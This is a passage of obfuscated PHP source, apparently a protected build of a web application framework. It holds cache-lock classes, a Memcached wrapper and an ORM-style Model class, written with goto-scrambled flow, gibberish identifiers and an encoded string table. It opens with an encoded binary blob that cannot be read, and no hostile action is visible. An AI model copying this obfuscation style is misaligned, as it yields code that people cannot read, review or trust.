IxX5g=')."\137\125\2\71\343\343\105\340\7\255\321\71\21\174\7\336\277\72\20\216\204\313\222\372\275\341\360\140\60\344\303\272\247\145\311\50\227\240\3\120\226\324\337\35\354\233\55\315\337\353\15\364\224\245\101\235"."\0\250\21\113\237\303\304\111\201\176\124\113\157\117\17\125\100\53\257\105\240\143\5\257\11\272\376\342\207\265\205\214\116\317\76\35\312\61\364\154\73\254\320\151\2\231\77\333\32\13\141\65\307\316\254\204"."\342\354\347\11\342\220\233\364\271\126\26\50\224\155\77\4\51\1\336\341\367\221\302\102\324\345\43\174\33\234\115\177\46\12\243\306\211\312\100\374\262\317\155\273\24\24\340\150\342\40\46\44\20\244\270\6"."\43\0\121\136\165\134\312\70\72\263\313\161\374\152\273\326\103\20\336\41\260\336\47\121\227\17\243\172\134\270\351\301\174\312\306\241\104\55\14\34\166\60\260\144\104\217\50\151\302\127\240\124\302\143\355\123".strrev(''."\0".''."\0".'Ã>ÿßáÿKØdË…ŠÉİnôÒRÅlehø<Xb'), 10, -8))); goto E³è‘ó¶·„; aêÜšîè¾é: class CacheLockMemcached { public function lock($döäšèÏ»É, $F©­‰—×’ = 0) { $EÇøÍÆõ¨÷ = Cache::init(); $b”ÕÕÏª¡é = microtime(!0) + $F©­‰—×’; while (microtime(!0) < $b”ÕÕÏª¡é) { $eÒ»Æ­˜¿‰ = $EÇøÍÆõ¨÷->get($döäšèÏ»É); if (!$eÒ»Æ­˜¿‰ || $eÒ»Æ­˜¿‰ < microtime(!0)) { $e¨ÉöºÉÇ = $EÇøÍÆõ¨÷->handle->add($döäšèÏ»É, $b”ÕÕÏª¡é, $F©­‰—×’); if ($e¨ÉöºÉÇ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($B…†šİ·Øï) { return Cache::init()->get($B…†šİ·Øï); } public function unlock($b£æÙ¨›¢³) { return Cache::init()->remove($b£æÙ¨›¢³); } } class CacheLockDatabase { public function lock($aÂ×Ş†Çš, $F·Œãßà½ = 0) { $Dé–ù¬µ¶ = Model($_SERVER[Ö¹ñÒÁ²÷][752]); $aŒ’¿¼ÕŠ™ = microtime(!0) + $F·Œãßà½; while (microtime(!0) < $aŒ’¿¼ÕŠ™) { $A¾æêãÑ±¼ = $Dé–ù¬µ¶->get($aÂ×Ş†Çš); if (!$A¾æêãÑ±¼ || $A¾æêãÑ±¼ < microtime(!0)) { $aÊ…¡½¡œÃ = $Dé–ù¬µ¶->set($aÂ×Ş†Çš, $aŒ’¿¼ÕŠ™); if ($aÊ…¡½¡œÃ) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($EæÃÖ«·îà) { return Model($_SERVER[Ö¹ñÒÁ²÷][752])->get($EæÃÖ«·îà); } public function unlock($EÍ‚Áš³š£) { Model($_SERVER[Ö¹ñÒÁ²÷][752])->remove($EÍ‚Áš³š£); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($C¦˜“ùÊá, $fò…Œ’æ¹”) { $dÛ„£ŠÂ´‰ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!class_exists($dÛ„£ŠÂ´‰[773])) { show_json($dÛ„£ŠÂ´‰[774], !1); } $this->cacheTime = $fò…Œ’æ¹”; $this->handle = new Memcached(); if (is_array($C¦˜“ùÊá[$dÛ„£ŠÂ´‰[775]]) && count($C¦˜“ùÊá[$dÛ„£ŠÂ´‰[775]]) >= 1) { foreach ($C¦˜“ùÊá[$dÛ„£ŠÂ´‰[775]] as $aÁ‚˜Ó®òÙ) { $BŸÎš‹È–½ = explode($dÛ„£ŠÂ´‰[4], $aÁ‚˜Ó®òÙ); $this->handle->addServer($BŸÎš‹È–½[0], $BŸÎš‹È–½[1]); } } else { $this->handle->addServer($C¦˜“ùÊá[$dÛ„£ŠÂ´‰[165]], $C¦˜“ùÊá[$dÛ„£ŠÂ´‰[166]]); } } public function set($DĞ¦ÚãìÂ, $EÜ²Øá†ãØ, $fš¨åö¸â = false) { $fš¨åö¸â = $fš¨åö¸â ? $fš¨åö¸â : $this->cacheTime; return $this->handle->set($DĞ¦ÚãìÂ, $EÜ²Øá†ãØ, $fš¨åö¸â); } public function get($aÅÓàÁö‰¥) { return $this->handle->get($aÅÓàÁö‰¥); } public function remove($C„‡Éœ«ÍÔ) { return $this->handle->delete($C„‡Éœ«ÍÔ); } public function deleteAll() { return $this->handle->flush(); } } goto a£šŸé×§; a–ÔèŠ±ª: define($_SERVER[Ö¹ñÒÁ²÷][226], 0); define($_SERVER[Ö¹ñÒÁ²÷][227], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\145", "\x6f\x72\144\x65\x72", "\x61\x6c\151\x61\x73", "\x68\x61\166\x69\156\x67", "\x67\x72\157\165\x70", "\154\x6f\x63\x6b", "\144\151\163\164\151\x6e\143\x74", "\x61\x75\x74\157", "\x66\x69\x6c\x74\x65\162", "\166\x61\154\x69\x64\x61\x74\x65", "\x72\145\x73\165\x6c\164", "\x62\151\x6e\x64", "\164\x6f\153\x65\156"); public function __construct($dƒ„¹ÔìŞì = '', $F…Ÿê˜­ŠÁ = '', $CŞŒ½À‘Ú… = '') { $D²÷¶Ü÷•‹ =& $_SERVER[Ö¹ñÒÁ²÷]; $this->_initialize(); if (!empty($dƒ„¹ÔìŞì)) { if (strpos($dƒ„¹ÔìŞì, $D²÷¶Ü÷•‹[91])) { list($this->dbName, $this->name) = explode($D²÷¶Ü÷•‹[91], $dƒ„¹ÔìŞì); } else { $this->name = $dƒ„¹ÔìŞì; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($F…Ÿê˜­ŠÁ)) { $this->tablePrefix = $D²÷¶Ü÷•‹[33]; } elseif ($D²÷¶Ü÷•‹[33] != $F…Ÿê˜­ŠÁ) { $this->tablePrefix = $F…Ÿê˜­ŠÁ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($D²÷¶Ü÷•‹[228]); } $this->db(0, empty($this->connection) ? $CŞŒ½À‘Ú… : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $Cöä‚–Ë× =& $_SERVER[Ö¹ñÒÁ²÷]; if (empty($this->fields)) { if (think_config($Cöä‚–Ë×[229])) { $f‹«ÔÇæ¡ = $this->dbName ? $this->dbName : think_config($Cöä‚–Ë×[230]); $d„Ñ ¼½Â = think_var_cache($Cöä‚–Ë×[231] . strtolower(get_path_this($f‹«ÔÇæ¡) . $Cöä‚–Ë×[91] . $this->name)); if ($d„Ñ ¼½Â) { $aá‡±º‘²— = think_config($Cöä‚–Ë×[232]); if (empty($aá‡±º‘²—) || $d„Ñ ¼½Â[$Cöä‚–Ë×[233]] == $aá‡±º‘²—) { $this->fields = $d„Ñ ¼½Â; return; } } } $this->flush(); } } public function flush() { goto b”ëğíäï; b”ëğíäï: $Fâˆ‘“Æ» =& $_SERVER[Ö¹ñÒÁ²÷]; $this->db->setModel($this->name); $a“æíå¥„ = $this->db->getFields($this->getTableName()); goto dİå§°Ïè; F”¥³†‚æ: if (think_config($Fâˆ‘“Æ»[229])) { $F¨£Ÿà«®Â = $this->dbName ? $this->dbName : think_config($Fâˆ‘“Æ»[230]); think_var_cache($Fâˆ‘“Æ»[231] . strtolower(get_path_this($F¨£Ÿà«®Â) . $Fâˆ‘“Æ»[91] . $this->name), $this->fields); } goto bµ”î‡¥ˆª; bœ•„ËÓĞ: foreach ($a“æíå¥„ as $bêÛÌèÅ‡ => $e‰¯êë‹ÃÎ) { $bœÁÖ¹ôÆË[$bêÛÌèÅ‡] = $e‰¯êë‹ÃÎ[$Fâˆ‘“Æ»[29]]; if ($e‰¯êë‹ÃÎ[$Fâˆ‘“Æ»[36]]) { $this->fields[$Fâˆ‘“Æ»[235]] = $bêÛÌèÅ‡; if ($e‰¯êë‹ÃÎ[$Fâˆ‘“Æ»[39]]) { $this->fields[$Fâˆ‘“Æ»[234]] = !0; } } } $this->fields[$Fâˆ‘“Æ»[236]] = $bœÁÖ¹ôÆË; if (think_config($Fâˆ‘“Æ»[232])) { $this->fields[$Fâˆ‘“Æ»[233]] = think_config($Fâˆ‘“Æ»[232]); } goto F”¥³†‚æ; dİå§°Ïè: if (!$a“æíå¥„) { return !1; } $this->fields = array_keys($a“æíå¥„); $this->fields[$Fâˆ‘“Æ»[234]] = !1; goto bœ•„ËÓĞ; bµ”î‡¥ˆª: } public function switchModel($få‰ãª¼Ê, $EğÃ˜Ë¼Ùò = array()) { $AùöÓÏİ» =& $_SERVER[Ö¹ñÒÁ²÷]; $fã‚ÇÈÈ¹ñ = ucwords(strtolower($få‰ãª¼Ê)) . $AùöÓÏİ»[237]; if (!class_exists($fã‚ÇÈÈ¹ñ)) { think_exception($fã‚ÇÈÈ¹ñ . think_lang($AùöÓÏİ»[238])); } $this->_extModel = new $fã‚ÇÈÈ¹ñ($this->name); if (!empty($EğÃ˜Ë¼Ùò)) { foreach ($EğÃ˜Ë¼Ùò as $CËÙ­»ì¿™) { $this->_extModel->setProperty($CËÙ­»ì¿™, $this->{$CËÙ­»ì¿™}); } } return $this->_extModel; } public function __set($b×Ï—Úê÷Ô, $D£ÃìáŒªâ) { $this->data[$b×Ï—Úê÷Ô] = $D£ÃìáŒªâ; } public function __get($eªš¼í¬›ù) { return isset($this->data[$eªš¼í¬›ù]) ? $this->data[$eªš¼í¬›ù] : null; } public function __isset($B¤¢°´äéñ) { return isset($this->data[$B¤¢°´äéñ]); } public function __unset($F¡ÊÖâøÜ) { unset($this->data[$F¡ÊÖâøÜ]); } public function __call($B”‚Å†ŸË, $eíƒÂ) { $AÉØ­Ü¨ë =& $_SERVER[Ö¹ñÒÁ²÷]; if (in_array(strtolower($B”‚Å†ŸË), $this->methods, !0)) { $this->options[strtolower($B”‚Å†ŸË)] = $eíƒÂ[0]; return $this; } elseif (in_array(strtolower($B”‚Å†ŸË), array($AÉØ­Ü¨ë[239], $AÉØ­Ü¨ë[240], $AÉØ­Ü¨ë[241], $AÉØ­Ü¨ë[242], $AÉØ­Ü¨ë[243]), !0)) { $dÈêêôÛÂ = isset($eíƒÂ[0]) ? $eíƒÂ[0] : $AÉØ­Ü¨ë[172]; $dÈêêôÛÂ = $this->db->parseKey($dÈêêôÛÂ); return $this->getField(strtoupper($B”‚Å†ŸË) . $AÉØ­Ü¨ë[244] . $dÈêêôÛÂ . $AÉØ­Ü¨ë[245] . $B”‚Å†ŸË, $AÉØ­Ü¨ë[239]); } elseif (strtolower(substr($B”‚Å†ŸË, 0, 5)) == $AÉØ­Ü¨ë[246]) { $dÈêêôÛÂ = think_parse_name(substr($B”‚Å†ŸË, 5)); $bóÆİ™Ö¯[$dÈêêôÛÂ] = $eíƒÂ[0]; return $this->where($bóÆİ™Ö¯)->find(); } elseif (strtolower(substr($B”‚Å†ŸË, 0, 10)) == $AÉØ­Ü¨ë[247]) { $dê‡ Ò““Ñ = think_parse_name(substr($B”‚Å†ŸË, 10)); $bóÆİ™Ö¯[$dê‡ Ò““Ñ] = $eíƒÂ[0]; return $this->where($bóÆİ™Ö¯)->getField($eíƒÂ[1]); } elseif (isset($this->_scope[$B”‚Å†ŸË])) { return $this->scope($B”‚Å†ŸË, $eíƒÂ[0]); } elseif (method_exists($this, $B”‚Å†ŸË)) { array_unshift($eíƒÂ, $B”‚Å†ŸË); return call_user_func_array(array($this, $AÉØ­Ü¨ë[248]), $eíƒÂ); } else { return call_user_func_array(array(parent, $B”‚Å†ŸË), $eíƒÂ); } } protected function call() { goto d¯¥ˆñïì; AÊ„²æ´Ó¨: $cˆö²â©ó¤ = call_user_func_array(array($this, $bŒÉ›—¡ÏÅ), $DŞ²•¦ê·ì); if (method_exists($this, $CÈ¡Û”²Œ[252])) { $c¸Ş¾à†ôÎ = call_user_func_array(array($this, $CÈ¡Û”²Œ[253]), array($e¹³“Ãº‚¯, $DŞ²•¦ê·ì, $cˆö²â©ó¤)); if ($c¸Ş¾à†ôÎ) { return $c¸Ş¾à†ôÎ; } } return $cˆö²â©ó¤; goto bëìÛ…İÈš; d¯¥ˆñïì: $CÈ¡Û”²Œ =& $_SERVER[Ö¹ñÒÁ²÷]; $DŞ²•¦ê·ì = func_get_args(); $bŒÉ›—¡ÏÅ = array_shift($DŞ²•¦ê·ì); goto FÀ½‚¯­Œ; E•Õ§â¬ë‚: if (isset($DŞ²•¦ê·ì[$c’àŠí÷…ñ]) && $DŞ²•¦ê·ì[$c’àŠí÷…ñ] === $bŒÉ›—¡ÏÅ) { think_exception(__CLASS__ . $CÈ¡Û”²Œ[4] . $bŒÉ›—¡ÏÅ . think_lang($CÈ¡Û”²Œ[249])); return; } $DŞ²•¦ê·ì[] = $bŒÉ›—¡ÏÅ; if (method_exists($this, $CÈ¡Û”²Œ[250])) { $c¸Ş¾à†ôÎ = call_user_func_array(array($this, $CÈ¡Û”²Œ[251]), array($e¹³“Ãº‚¯, $DŞ²•¦ê·ì)); if (!is_null($c¸Ş¾à†ôÎ) && $c¸Ş¾à†ôÎ !== !1) { return $c¸Ş¾à†ôÎ; } } goto AÊ„²æ´Ó¨; FÀ½‚¯­Œ: $e¹³“Ãº‚¯ = $bŒÉ›—¡ÏÅ; if (is_array($bŒÉ›—¡ÏÅ)) { $e¹³“Ãº‚¯ = $bŒÉ›—¡ÏÅ[1]; $bŒÉ›—¡ÏÅ = $bŒÉ›—¡ÏÅ[0]; } $c’àŠí÷…ñ = count($DŞ²•¦ê·ì) - 1; goto E•Õ§â¬ë‚; bëìÛ…İÈš: } protected function _initialize() { } protected function _facade($FŠŸøÎ°è) { $AÓŠáğñòÚ =& $_SERVER[Ö¹ñÒÁ²÷]; if (!empty($this->fields)) { foreach ($FŠŸøÎ°è as $Cì‚Î§£˜¡ => $F–’…øäŞº) { if (!in_array($Cì‚Î§£˜¡, $this->fields, !0)) { unset($FŠŸøÎ°è[$Cì‚Î§£˜¡]); } elseif (is_scalar($F–’…øäŞº)) { $this->_parseType($FŠŸøÎ°è, $Cì‚Î§£˜¡); } } } if (!empty($this->options[$AÓŠáğñòÚ[254]])) { $FŠŸøÎ°è = array_map($this->options[$AÓŠáğñòÚ[254]], $FŠŸøÎ°è); unset($this->options[$AÓŠáğñòÚ[254]]); } $this->_beforeWrite($FŠŸøÎ°è); return $FŠŸøÎ°è; } protected function _beforeWrite(&$E¿ö¨Š¥) { } public function add($CõÙéì§… = '', $Bß’»¶Â§ê = array(), $CÙÃéŠÁ„İ = false) { goto Fï”•„ÌÈÄ; Fï”•„ÌÈÄ: if (empty($CõÙéì§…)) { if (!empty($this->data)) { $CõÙéì§… = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ö¹ñÒÁ²÷][255]); return !1; } } $Bß’»¶Â§ê = $this->_parseOptions($Bß’»¶Â§ê); $CõÙéì§… = $this->_facade($CõÙéì§…); goto bøÆùóË†¶; DÛá×âä…: return $AŒïÜ½Ã™İ; goto D¡’£ù·¤±; bøÆùóË†¶: if (!1 === $this->_beforeInsert($CõÙéì§…, $Bß’»¶Â§ê)) { return !1; } $AŒïÜ½Ã™İ = $this->db->insert($CõÙéì§…, $Bß’»¶Â§ê, $CÙÃéŠÁ„İ); if (!1 !== $AŒïÜ½Ã™İ) { $BùŒˆğ¨Ëá = $this->getLastInsID(); if ($BùŒˆğ¨Ëá) { $CõÙéì§…[$this->getPk()] = $BùŒˆğ¨Ëá; $this->_after_insert($CõÙéì§…, $Bß’»¶Â§ê); return $BùŒˆğ¨Ëá; } $this->_after_insert($CõÙéì§…, $Bß’»¶Â§ê); } goto DÛá×âä…; D¡’£ù·¤±: } protected function _beforeInsert(&$BˆÂŒ¢ì², $BŸ ¸š•êê) { } protected function _after_insert($CÎ”Œñ±›à, $báªÊ³‚ï) { } public function addAll($D‡È±ğæÏ, $e¦ÁÍ™ò®ê = array(), $còï£««÷Î = false) { goto EØ›ù²—áê; AŒä”£ƒËÍ: return $BÍÛ·×ê«; goto fòó Œ™Ç˜; D—ËÛÃÒ‘µ: foreach ($D‡È±ğæÏ as $eƒ“éÓ´š => $B¢¥‚‰Ùç¬) { $D‡È±ğæÏ[$eƒ“éÓ´š] = $this->_facade($B¢¥‚‰Ùç¬); } if (method_exists($this->db, $fîã‰ñÅß[256])) { $BÍÛ·×ê« = $this->db->insertAll($D‡È±ğæÏ, $e¦ÁÍ™ò®ê, $còï£««÷Î); } else { $this->startTrans(); foreach ($D‡È±ğæÏ as $eƒ“éÓ´š => $B¢¥‚‰Ùç¬) { $BÍÛ·×ê« = $this->db->insert($B¢¥‚‰Ùç¬, $e¦ÁÍ™ò®ê, $còï£««÷Î); } $this->commit(); } if (!1 !== $BÍÛ·×ê«) { $F‚ á¶®Ø• = $this->getLastInsID(); if ($F‚ á¶®Ø•) { return $F‚ á¶®Ø•; } } goto AŒä”£ƒËÍ; EØ›ù²—áê: $fîã‰ñÅß =& $_SERVER[Ö¹ñÒÁ²÷]; if (empty($D‡È±ğæÏ)) { $this->error = think_lang($fîã‰ñÅß[255]); return !1; } $e¦ÁÍ™ò®ê = $this->_parseOptions($e¦ÁÍ™ò®ê); goto D—ËÛÃÒ‘µ; fòó Œ™Ç˜: } public function selectAdd($aÁÖÎÆñ” = '', $DÛ±ƒğ¶„ê = '', $cİ²ù¿è‹ = array()) { $fñº‹ù¤¦ğ =& $_SERVER[Ö¹ñÒÁ²÷]; $cİ²ù¿è‹ = $this->_parseOptions($cİ²ù¿è‹); if (!1 === ($fÅ˜·‹ªÌ = $this->db->selectInsert($aÁÖÎÆñ” ? $aÁÖÎÆñ” : $cİ²ù¿è‹[$fñº‹ù¤¦ğ[257]], $DÛ±ƒğ¶„ê ? $DÛ±ƒğ¶„ê : $this->getTableName(), $cİ²ù¿è‹))) { $this->error = think_lang($fñº‹ù¤¦ğ[258]); return !1; } else { return $fÅ˜·‹ªÌ; } } public function save($B‰÷®ˆÂ™Ä = '', $DŞ†ğ˜šŠ¹ = array()) { goto DÀƒİ¯Ï“¸; DÀƒİ¯Ï“¸: $c×«‡ÙÑŠ =& $_SERVER[Ö¹ñÒÁ²÷]; if (empty($B‰÷®ˆÂ™Ä)) { if (!empty($this->data)) { $B‰÷®ˆÂ™Ä = $this->data; $this->data = array(); } else { $this->error = think_lang($c×«‡ÙÑŠ[255]); return !1; } } $B‰÷®ˆÂ™Ä = $this->_facade($B‰÷®ˆÂ™Ä); goto c÷°õÓ¥Ä; e¡Ç®‹áŠµ: if (!1 !== $aîƒƒÏ·ô¢) { if (isset($c•öÊİ–Ê)) { $B‰÷®ˆÂ™Ä[$b´Ê•ŠĞ¨É] = $c•öÊİ–Ê; } $this->_afterUpdate($B‰÷®ˆÂ™Ä, $DŞ†ğ˜šŠ¹); } return $aîƒƒÏ·ô¢; goto BñÛ«Ì©Îé; c÷°õÓ¥Ä: $DŞ†ğ˜šŠ¹ = $this->_parseOptions($DŞ†ğ˜šŠ¹); $b´Ê•ŠĞ¨É = $this->getPk(); if (!isset($DŞ†ğ˜šŠ¹[$c×«‡ÙÑŠ[259]])) { if (isset($B‰÷®ˆÂ™Ä[$b´Ê•ŠĞ¨É])) { $föğô“»©³[$b´Ê•ŠĞ¨É] = $B‰÷®ˆÂ™Ä[$b´Ê•ŠĞ¨É]; $DŞ†ğ˜šŠ¹[$c×«‡ÙÑŠ[259]] = $föğô“»©³; unset($B‰÷®ˆÂ™Ä[$b´Ê•ŠĞ¨É]); } else { $this->error = think_lang($c×«‡ÙÑŠ[258]); return !1; } } goto Eö‹šÖÅ³; Eö‹šÖÅ³: if (is_array($DŞ†ğ˜šŠ¹[$c×«‡ÙÑŠ[259]]) && isset($DŞ†ğ˜šŠ¹[$c×«‡ÙÑŠ[259]][$b´Ê•ŠĞ¨É])) { $c•öÊİ–Ê = $DŞ†ğ˜šŠ¹[$c×«‡ÙÑŠ[259]][$b´Ê•ŠĞ¨É]; } if (!1 === $this->_beforeUpdate($B‰÷®ˆÂ™Ä, $DŞ†ğ˜šŠ¹)) { return !1; } $aîƒƒÏ·ô¢ = $this->db->update($B‰÷®ˆÂ™Ä, $DŞ†ğ˜šŠ¹); goto e¡Ç®‹áŠµ; BñÛ«Ì©Îé: } protected function _beforeUpdate(&$EÇÏ³²Ò±İ, $aâ¥Ïè˜Ï) { } protected function _afterUpdate($DÕò÷ª”õÁ, $DÙ±¿ÑóÎì) { } public function delete($d „Ê¿¼›Á = array()) { goto a²¾¸ˆµŒ½; Døšô±ù¬ù: $bÚÖ–Ò®×Ã = $this->db->delete($d „Ê¿¼›Á); if (!1 !== $bÚÖ–Ò®×Ã) { $A‹ç«÷†¿Ö = array(); if (isset($a¶‘Îí½ÀÍ)) { $A‹ç«÷†¿Ö[$FÙÜíéã‡‰] = $a¶‘Îí½ÀÍ; } $this->_after_delete($A‹ç«÷†¿Ö, $d „Ê¿¼›Á); } return $bÚÖ–Ò®×Ã; goto fÛ“Ì™›ïÖ; a“Ä¶ˆÉŒ: if (is_numeric($d „Ê¿¼›Á) || is_string($d „Ê¿¼›Á)) { if (strpos($d „Ê¿¼›Á, $A¥µå•¹¢§[47])) { $E¬ğœ©µ¸ä[$FÙÜíéã‡‰] = array($A¥µå•¹¢§[260], $d „Ê¿¼›Á); } else { $E¬ğœ©µ¸ä[$FÙÜíéã‡‰] = $d „Ê¿¼›Á; } $this->options[$A¥µå•¹¢§[259]] = $E¬ğœ©µ¸ä; } $d „Ê¿¼›Á = $this->_parseOptions(); if (is_array($d „Ê¿¼›Á[$A¥µå•¹¢§[259]]) && isset($d „Ê¿¼›Á[$A¥µå•¹¢§[259]][$FÙÜíéã‡‰])) { $a¶‘Îí½ÀÍ = $d „Ê¿¼›Á[$A¥µå•¹¢§[259]][$FÙÜíéã‡‰]; } goto Døšô±ù¬ù; a²¾¸ˆµŒ½: $A¥µå•¹¢§ =& $_SERVER[Ö¹ñÒÁ²÷]; if (empty($d „Ê¿¼›Á) && empty($this->options[$A¥µå•¹¢§[259]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $FÙÜíéã‡‰ = $this->getPk(); goto a“Ä¶ˆÉŒ; fÛ“Ì™›ïÖ: } protected function _after_delete($aÕÃ‚òÛÀ«, $A¬×Õ˜À«î) { } public function select($A†—Üƒ´»ˆ = array()) { goto D‘„š¾«Àâ; D‘„š¾«Àâ: $A©‰›Í¢» =& $_SERVER[Ö¹ñÒÁ²÷]; if (is_string($A†—Üƒ´»ˆ) || is_numeric($A†—Üƒ´»ˆ)) { $aëĞ„”ˆç¤ = $this->getPk(); if (strpos($A†—Üƒ´»ˆ, $A©‰›Í¢»[47])) { $Eùì‰‘Í¡[$aëĞ„”ˆç¤] = array($A©‰›Í¢»[260], $A†—Üƒ´»ˆ); } else { $Eùì‰‘Í¡[$aëĞ„”ˆç¤] = $A†—Üƒ´»ˆ; } $this->options[$A©‰›Í¢»[259]] = $Eùì‰‘Í¡; } elseif (!1 === $A†—Üƒ´»ˆ) { $A†—Üƒ´»ˆ = $this->_parseOptions(); return $A©‰›Í¢»[261] . $this->db->buildSelectSql($A†—Üƒ´»ˆ) . $A©‰›Í¢»[262]; } $A†—Üƒ´»ˆ = $this->_parseOptions(); goto EñÍäÖŞÚŸ; c½óÃŒãŞ: $this->_afterSelect($BÏªœåç»„, $A†—Üƒ´»ˆ); return $BÏªœåç»„; goto c…ëÏ¶…®; EñÍäÖŞÚŸ: $BÏªœåç»„ = $this->db->select($A†—Üƒ´»ˆ); if (!1 === $BÏªœåç»„) { return !1; } if (empty($BÏªœåç»„)) { return null; } goto c½óÃŒãŞ; c…ëÏ¶…®: } protected function _afterSelect(&$BïßøÓàÔ„, $dŠÎ°‡óŞÚ) { } public function buildSql($fë¢Ä‘ïÌÎ = array()) { $d¤Ç…ïªªÑ =& $_SERVER[Ö¹ñÒÁ²÷]; $fë¢Ä‘ïÌÎ = $this->_parseOptions($fë¢Ä‘ïÌÎ); return $d¤Ç…ïªªÑ[261] . $this->db->buildSelectSql($fë¢Ä‘ïÌÎ) . $d¤Ç…ïªªÑ[262]; } public function optionsValue($fŞ¤£ÃÑÀÎ = null) { if (is_null($fŞ¤£ÃÑÀÎ)) { return $this->options; } elseif (is_array($fŞ¤£ÃÑÀÎ)) { $this->options = array_merge($this->options, $fŞ¤£ÃÑÀÎ); } } protected function _parseOptions($BÚİÑ‘Ù•õ = array()) { goto bœÈœˆå¯™; bœÈœˆå¯™: $D»¤ŠíÀÑí =& $_SERVER[Ö¹ñÒÁ²÷]; if (is_array($BÚİÑ‘Ù•õ)) { $BÚİÑ‘Ù•õ = array_merge($this->options, $BÚİÑ‘Ù•õ); } $this->options = array(); goto fÁÆÇ°µ«£; dÎÎÕ×ÇÜ™: if (isset($BÚİÑ‘Ù•õ[$D»¤ŠíÀÑí[259]]) && is_array($BÚİÑ‘Ù•õ[$D»¤ŠíÀÑí[259]]) && !empty($AãÍ¡Á»¦) && !isset($BÚİÑ‘Ù•õ[$D»¤ŠíÀÑí[266]]) && !isset($BÚİÑ‘Ù•õ[$D»¤ŠíÀÑí[263]])) { foreach ($BÚİÑ‘Ù•õ[$D»¤ŠíÀÑí[259]] as $FÏö—Çô©¹ => $A°ÕÖó’Õõ) { $FÏö—Çô©¹ = trim($FÏö—Çô©¹); if (in_array($FÏö—Çô©¹, $AãÍ¡Á»¦, !0)) { if (is_scalar($A°ÕÖó’Õõ)) { $this->_parseType($BÚİÑ‘Ù•õ[$D»¤ŠíÀÑí[259]], $FÏö—Çô©¹); } } elseif (!is_numeric($FÏö—Çô©¹) && $D»¤ŠíÀÑí[70] != substr($FÏö—Çô©¹, 0, 1) && !1 === strpos($FÏö—Çô©¹, $D»¤ŠíÀÑí[91]) && !1 === strpos($FÏö—Çô©¹, $D»¤ŠíÀÑí[244]) && !1 === strpos($FÏö—Çô©¹, $D»¤ŠíÀÑí[267]) && !1 === strpos($FÏö—Çô©¹, $D»¤ŠíÀÑí[268])) { unset($BÚİÑ‘Ù•õ[$D»¤ŠíÀÑí[259]][$FÏö—Çô©¹]); } } } $this->_options_filter($BÚİÑ‘Ù•õ); return $BÚİÑ‘Ù•õ; goto D“íÚœñ»; fÁÆÇ°µ«£: if (!isset($BÚİÑ‘Ù•õ[$D»¤ŠíÀÑí[263]])) { $BÚİÑ‘Ù•õ[$D»¤ŠíÀÑí[263]] = $this->getTableName(); $AãÍ¡Á»¦ = $this->fields; } else { $AãÍ¡Á»¦ = $this->getDbFields(); } if (!empty($BÚİÑ‘Ù•õ[$D»¤ŠíÀÑí[264]])) { $BÚİÑ‘Ù•õ[$D»¤ŠíÀÑí[263]] .= $D»¤ŠíÀÑí[50] . $BÚİÑ‘Ù•õ[$D»¤ŠíÀÑí[264]]; } $BÚİÑ‘Ù•õ[$D»¤ŠíÀÑí[265]] = $this->name; goto dÎÎÕ×ÇÜ™; D“íÚœñ»: } protected function _options_filter(&$A´ Ñ­Å—‹) { } protected function _parseType(&$f®çœî‡†, $aèó°Ú†ã) { $bÚ™Í£— =& $_SERVER[Ö¹ñÒÁ²÷]; if (empty($this->options[$bÚ™Í£—[269]][$bÚ™Í£—[4] . $aèó°Ú†ã])) { $d“¦³´êàÂ = strtolower($this->fields[$bÚ™Í£—[236]][$aèó°Ú†ã]); if (!1 !== strpos($d“¦³´êàÂ, $bÚ™Í£—[270])) { } elseif (!1 === strpos($d“¦³´êàÂ, $bÚ™Í£—[271]) && !1 !== strpos($d“¦³´êàÂ, $bÚ™Í£—[272])) { $f®çœî‡†[$aèó°Ú†ã] = intval($f®çœî‡†[$aèó°Ú†ã]); } elseif (!1 !== strpos($d“¦³´êàÂ, $bÚ™Í£—[273]) || !1 !== strpos($d“¦³´êàÂ, $bÚ™Í£—[274])) { $f®çœî‡†[$aèó°Ú†ã] = floatval($f®çœî‡†[$aèó°Ú†ã]); } elseif (!1 !== strpos($d“¦³´êàÂ, $bÚ™Í£—[275])) { $f®çœî‡†[$aèó°Ú†ã] = (bool) $f®çœî‡†[$aèó°Ú†ã]; } } } public function find($Cè©¸ğÖÈ„ = array()) { goto d…éŞ™¤øŸ; C·ˆâ‘â¯: if (!empty($this->options[$aÁÊ…½±Ê‚[277]])) { return $this->returnResult($this->data, $this->options[$aÁÊ…½±Ê‚[277]]); } return $this->data; goto dºÀ„¾œ¶Œ; d‡ù²Å–’ë: $Cè©¸ğÖÈ„ = $this->_parseOptions(); $CÅ÷ãä–œˆ = $this->db->select($Cè©¸ğÖÈ„); if (!1 === $CÅ÷ãä–œˆ) { return !1; } goto C›®Ø‚‚Æ; d…éŞ™¤øŸ: $aÁÊ…½±Ê‚ =& $_SERVER[Ö¹ñÒÁ²÷]; if (is_numeric($Cè©¸ğÖÈ„) || is_string($Cè©¸ğÖÈ„)) { $cÖ÷îµåËí[$this->getPk()] = intval($Cè©¸ğÖÈ„); $this->options[$aÁÊ…½±Ê‚[259]] = $cÖ÷îµåËí; } $this->options[$aÁÊ…½±Ê‚[276]] = 1; goto d‡ù²Å–’ë; C›®Ø‚‚Æ: if (empty($CÅ÷ãä–œˆ)) { return null; } $this->data = $CÅ÷ãä–œˆ[0]; $this->_afterFind($this->data, $Cè©¸ğÖÈ„); goto C·ˆâ‘â¯; dºÀ„¾œ¶Œ: } protected function _afterFind(&$fœ¥ÌáœÇÓ, $b¥âÑƒñ²Ğ) { } protected function returnResult($bƒ×İÄ„‰¬, $fæª¶¼²ğ = '') { 